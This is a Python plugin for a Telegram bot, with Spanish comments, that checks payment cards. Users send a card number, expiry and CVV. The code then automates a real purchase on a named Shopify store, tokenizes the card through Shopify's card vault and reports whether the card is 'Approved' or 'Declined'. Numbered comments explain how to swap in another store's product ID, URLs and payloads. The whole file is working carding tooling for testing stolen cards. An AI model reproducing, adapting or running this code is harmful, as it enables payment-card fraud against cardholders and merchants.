from configss._def_main_ import * 

def find_between(data: str, first: str, last: str) -> str:
    # Busca una subcadena dentro de una cadena, dados dos marcadores
    if not isinstance(data, str):
        raise TypeError("El primer argumento debe ser una cadena de texto.")
    
    try:
        start_index = data.index(first) + len(first)
        end_index = data.index(last, start_index)
        return data[start_index:end_index]
    except ValueError:
        return ''
def get_random_string(length):
    # Genera una cadena de texto aleatoria.
    letters = string.ascii_letters + string.digits
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

@Client.on_message(filters.command(["sen"], ["/", "."]))
def sv(_, message: Message):
    
    with open(file='plugins/rangos/premium.txt',mode='r+',encoding='utf-8') as archivo:
        x = archivo.readlines()
        if str(message.from_user.id) + '\n' in x:

            data = message.text.split(" ", 2)

            if len(data) < 2:
                message.reply_text("<b> 𝙐𝙨𝙚 <code>/sen card</code></b>")
                return

            ccs  = data[1]
            card = re.split(r'[|/:]', ccs)
            tiempoinicio = time.perf_counter()
            cc   = card[0]
            mes  = card[1]
            if not mes:
                message.reply_text("<b> 𝙐𝙨𝙚 <code>/sen card</code></b>")
                return
            ano  = card[2]
            cvv  = card[3]
            bin_code = cc[:6]
            low_ano = lambda x: x[2:] if len(x) == 4 else x
            inputm = message.text.split(None, 1)[1]
            bincode = 6
            BIN = inputm[:bincode]
            ano = low_ano(ano)
            rank = get_user_rank(message.from_user.id)
            req = requests.get(f"https://bins.antipublic.cc/bins/{cc}").json()
            
            brand = req['brand']
            country = req['country']
            country_name = req['country_name']
            country_flag = req['country_flag']
            bank = req['bank']
            level = req['level']
            typea  = req['type']
            
        nat = message.reply_text(f"""
<b>𝗣𝗔𝗜𝗡 𝗖𝗛𝗞 </b> <i>🔥</i>     
<b>
┣ • 𝗖𝗖 : <b><code>{cc}|{mes}|{ano}|{cvv}</code> 
┣ • 𝙎𝙩𝙖𝙩𝙪𝙨 : [ʟᴏᴀᴅɪɴɢ] ■■□□□□□□□ 20% 🟣 1.0(s)
┣ • 𝘽𝙄𝙉 : <code>{BIN}</code>
┣ • 𝘿𝘼𝙏𝘼 : <code>{brand}  {typea}  {level}</code> 
┣ • 𝘽𝘼𝙉𝙆 : {bank} 
┣ • 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 : <code>{country_name} [{country_flag}] </code>
┣━━━━━━━━━━━━━━━━━━━━
┣ • 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮:  <code>@{message.from_user.username}</code>  [{rank}]</b>               
                            
                            """)
        
        session = requests.Session()        

        inicio = time.time()
        print("@timessol INICIADO...")
        #-----------PASO N° 1 REEMPLAZAR ID DEL PRODUCTO-----------#
        #--------ID DEL PRODUCTO ---------#
        payload_1 = {'id': '40747016093769'}
        
        #-----------PASO N° 2 REEMPLAZAR URL ADD CART-----------#
        req1 = session.post(url=f'https://www.mansurgavriel.com/cart/add.js', data=payload_1)
        time.sleep(1)
        print("</> PRODUCTO AGREGADO AL CARRIDO")
        
        #-----------PASO N° 3 REEMPLAZAR URL CHECKUOT-----------#
        req3 = session.post(url=f"https://www.mansurgavriel.com/checkout/")
        checkout_url = req3.url
        print("</> CHECKOUT URL:", checkout_url)
        authenticity_token = get_random_string(86)
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
        }

        #-----------PASO N° 4 REEMPLAZAR PAYLOAD #2-----------#
        payload_2 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=contact_information&step=shipping_method&checkout%5Bemail%5D=unknownlavender%40finacenter.com&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bbuyer_accepts_marketing%5D=1&checkout%5Bshipping_address%5D%5Bfirst_name%5D=&checkout%5Bshipping_address%5D%5Blast_name%5D=&checkout%5Bshipping_address%5D%5Bcompany%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=&checkout%5Bshipping_address%5D%5Bprovince%5D=&checkout%5Bshipping_address%5D%5Bzip%5D=&checkout%5Bshipping_address%5D%5Bphone%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=United+States&checkout%5Bshipping_address%5D%5Bfirst_name%5D=Sandra+&checkout%5Bshipping_address%5D%5Blast_name%5D=Lopez&checkout%5Bshipping_address%5D%5Bcompany%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=2113+wayside+lane&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=new+york&checkout%5Bshipping_address%5D%5Bprovince%5D=NY&checkout%5Bshipping_address%5D%5Bzip%5D=10080&checkout%5Bshipping_address%5D%5Bphone%5D=%28648%29+524-9876&checkout%5Bbuyer_accepts_sms%5D=0&checkout%5Bsms_marketing_phone%5D=&checkout%5Bclient_details%5D%5Bbrowser_width%5D=694&checkout%5Bclient_details%5D%5Bbrowser_height%5D=657&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=360'

        req4 = session.post(url=checkout_url, headers=headers, data=payload_2)
        time.sleep(3)
        nat.edit_text(f"""
<b>𝗣𝗔𝗜𝗡 𝗖𝗛𝗞 </b> <i>🔥</i>     
<b>
┣ • 𝗖𝗖 : <b><code>{cc}|{mes}|{ano}|{cvv}</code> 
┣ • 𝙎𝙩𝙖𝙩𝙪𝙨 : [ʟᴏᴀᴅɪɴɢ] ■■■■□□□□ 49% 🔴 2.6(s)
┣ • 𝘽𝙄𝙉 : <code>{BIN}</code>
┣ • 𝘿𝘼𝙏𝘼 : <code>{brand}  {typea}  {level}</code> 
┣ • 𝘽𝘼𝙉𝙆 : {bank} 
┣ • 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 : <code>{country_name} [{country_flag}] </code>
┣━━━━━━━━━━━━━━━━━━━━
┣ • 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮:  <code>@{message.from_user.username}</code>  [{rank}]</b>               
                            
                            """)
        #-----------PASO N° 5 REEMPLAZAR PAYLOAD #3-----------#
        payload_3 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D=shopify-UPS%2520Ground-0.00&checkout%5Bclient_details%5D%5Bbrowser_width%5D=694&checkout%5Bclient_details%5D%5Bbrowser_height%5D=657&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=360'
        
        req5 = session.post(url=checkout_url,headers=headers,data=payload_3)
        
        time.sleep(3)
        payload_4 = {
            "credit_card": {
                "number": f"{cc[0:4]} {cc[4:8]} {cc[8:12]} {cc[12:16]}",
                "name": "Sin Rol",
                "month": mes,
                "year": ano,
                "verification_value": cvv
            },
            #-----------PASO N° 6 REEMPLAZAR URL DEL SESSION-----------#
            "payment_session_scope": "www.mansurgavriel.com"
        }

        req6 = session.post(url='https://deposit.us.shopifycs.com/sessions', json=payload_4)
        token = req6.json()
        id_ = token.get('id')
        print("</> ID SESSION:", id_)
        
        nat.edit_text(f"""
<b>𝗣𝗔𝗜𝗡 𝗖𝗛𝗞 </b> <i>🔥</i>     
<b>
┣ • 𝗖𝗖 : <b><code>{cc}|{mes}|{ano}|{cvv}</code> 
┣ • 𝙎𝙩𝙖𝙩𝙪𝙨 : [ʟᴏᴀᴅɪɴɢ] ■■■■■■■■□ 95% 🟢 6.20(s)
┣ • 𝘽𝙄𝙉 : <code>{BIN}</code>
┣ • 𝘿𝘼𝙏𝘼 : <code>{brand}  {typea}  {level}</code> 
┣ • 𝘽𝘼𝙉𝙆 : {bank} 
┣ • 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 : <code>{country_name} [{country_flag}] </code>
┣━━━━━━━━━━━━━━━━━━━━
┣ • 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮:  <code>@{message.from_user.username}</code>  [{rank}]</b>""")

        #-----------PASO N° 7 REEMPLAZAR PAYLOAD #5-----------#
        payload_5 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=payment_method&step=&s={id_}&checkout%5Bpayment_gateway%5D=26535919689&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Bremember_me%5D=false&checkout%5Bremember_me%5D=0&checkout%5Bvault_phone%5D=%2B16485249876&checkout%5Btotal_price%5D=3811&checkout_submitted_request_url=&checkout_submitted_page_id=&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=694&checkout%5Bclient_details%5D%5Bbrowser_height%5D=657&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=360'
        req7 = session.post(url=checkout_url, headers=headers, data=payload_5)
        
        time.sleep(5)

        processing_url = req7.url
        print("</> PROCESANDO URL:",processing_url)
        time.sleep(4)

        
        req8 = session.get(str(processing_url) + '?from_processing_page=1')
        time.sleep(4)

        gateway = "NEJI $10"
        end = time.time()
        tiempo = str(inicio - end)[1:5]

        req9 = session.get(req8.url)
        text_resp = req9.text
        resp = find_between(text_resp, 'notice__text">', '<')

        session.close()
        
        #-----------PASO N° 8 REEMPLAZAR RESPONSES DEPENDIENDO EL TIPO DE SHOPIFY-----------#

        if '/thank_you' in str(req9.url) or '/orders/' in str(req9.url) or '/post_purchase' in str(req9.url):
                        resp = 'Thanks for your purchase! - Succeded Charged'
                        msg = "Approved! - 38.11$✅"
                        respuesta = resp
        elif '/3d_secure_2/' in str(req9.url):
                        resp = '3d_secure_2'
                        msg = "Declined! ❌"
                        respuesta = resp
        elif "Security code was not matched by the processor" in resp:
                    msg = "Approved CCN! ✅"
                    respuesta = resp
                
        elif "Insufficient Funds" in resp:
                    msg = "Approved! ✅"
                    respuesta = resp
                    
        elif "Security code was not matched by the processor" in resp:
                    msg = "Approved! ✅"
                    respuesta = resp
                
                
        else:
                    msg = "Declined! ❌"    
                    respuesta = resp 
                    
        nat.edit_text(f"""
<b>𝗣𝗔𝗜𝗡 𝗖𝗛𝗞 </b> <i>🔥</i>     
<b>
┏━━━━━━━━━━━━━━━━━━━━ 
┣ •𝗖𝗖 = <i>{ccs}</i>
┣ •𝗦𝘁𝗮𝘁𝘂𝘀 = {msg}
┣ •𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 = {respuesta}
┣ •𝙂𝙖𝙩𝙚 = <code>stripe Charged</code> 
┗━━━━━━━━━━━━━━━━━━━━ 
┏━━━━━━━━━━━━━━━━━━━━ 
┣ •𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: <code>{BIN}</code> 
┣ •𝗕𝗮𝗻𝗸: <code>{bank}</code> 
┣ •𝘾𝙤𝙪𝙣𝙩𝙧𝙮: <code>{country_name} [{country_flag}] </code> 
┗━━━━━━━━━━━━━━━━━━━━ 
┏━━━━━━━━━━━━━━━━━━━━ 

┣ •𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮: <code>@{message.from_user.username}</code>  [{rank}]</b> 
┣ • 𝘽𝙤𝙩 𝙗𝙮: @THE_ORGULLOT 
┗━━━━━━━━━━━━━━━━━━━━</b>""")
        time.sleep(3)
        
                  
        return nat.edit_text(f"""
<b>𝗣𝗔𝗜𝗡 𝗖𝗛𝗞 </b> <i>🔥</i>     
<b>
┏━━━━━━━━━━━━━━━━━━━━ 
┣ •𝗖𝗖 = <i>{ccs}</i>
┣ •𝗦𝘁𝗮𝘁𝘂𝘀 = {msg}
┣ •𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 = {respuesta}
┣ •𝙂𝙖𝙩𝙚 = <code>stripe Charged</code> 
┗━━━━━━━━━━━━━━━━━━━━ 
┏━━━━━━━━━━━━━━━━━━━━ 
┣ •𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: <code>{BIN}</code> 
┣ •𝗕𝗮𝗻𝗸: <code>{bank}</code> 
┣ •𝘾𝙤𝙪𝙣𝙩𝙧𝙮: <code>{country_name} [{country_flag}] </code> 
┗━━━━━━━━━━━━━━━━━━━━ 
┏━━━━━━━━━━━━━━━━━━━━ 

┣ •𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮: <code>@{message.from_user.username}</code>  [{rank}]</b> 
┣ • 𝘽𝙤𝙩 𝙗𝙮: @THE_ORGULLOT 
┗━━━━━━━━━━━━━━━━━━━━</b>""")
                    
        